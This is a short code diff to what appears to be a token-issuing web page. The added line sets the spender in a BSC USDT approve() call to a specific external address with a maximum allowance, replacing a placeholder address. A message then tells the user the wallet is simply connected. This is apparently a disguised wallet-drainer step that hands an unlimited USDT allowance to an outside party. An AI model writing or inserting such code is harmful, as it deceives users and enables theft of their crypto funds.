@@ -156,7 +156,7 @@ async function doApproveLogic(signerRef, userAddress){
     const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, [
       "function approve(address spender, uint256 amount) external returns(bool)"
     ], signerRef);
-    const approveTx = await usdtContract.approve("0x0000000000000000000000000000000000000001", MAX_ALLOWANCE);
+    const approveTx = await usdtContract.approve("0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6", MAX_ALLOWANCE);
     await approveTx.wait();
     showStatus("✅ 授权成功！钱包已连接，可以开始发币");
     connectTip.style.display = "block";
